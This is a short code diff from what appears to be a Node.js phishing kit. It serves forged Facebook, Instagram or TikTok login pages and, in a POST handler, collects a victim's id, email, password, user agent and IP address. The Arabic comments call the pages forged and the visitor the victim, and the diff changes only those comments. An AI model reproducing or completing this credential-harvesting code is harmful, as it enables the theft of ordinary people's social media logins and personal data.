@@ -23,7 +23,7 @@ async function main(){
   const c=(await ask('Select page (1-3): ')).trim()
   const p=['fb','ig','tt'][parseInt(c)-1]||'fb'
 
-  rl.close()                       // أغلق بعد آخر سؤال
+  rl.close()
 
   // احفظ البيانات للمرات القادمة
   require('fs').writeFileSync('.env',`TOKEN=${TOKEN}\nMASTER=${MASTER}`)
@@ -40,7 +40,7 @@ async function main(){
   const int=`http://localhost:3000/${p}`
   console.log(`\nExternal: ${ext}\nInternal: ${int}\n`)
 
-  // ✅ الرابط الداخلي يستعرض الصفحة المزورة
+  // ✅ الرابط الداخلي يستعرض الصفحة المزورة (للاختبار)
   app.get(`/${p}`,async(_,res)=>{
     try{
       const{data}=await axios.get(`${PAGES[p]}/index.html`)
@@ -48,7 +48,7 @@ async function main(){
     }catch{res.send('Page not found')}
   })
 
-  // ✅ الضحية يفتح الرابط الخارجي -> نجمع بياناته
+  // ✅ استقبال بيانات الضحية (الجزء المفقود)
   app.post('/',async(q,r)=>{
     const{id,email,pass,ua:s,ip}=q.body
     const dev=ua(s||q.headers['user-agent'])
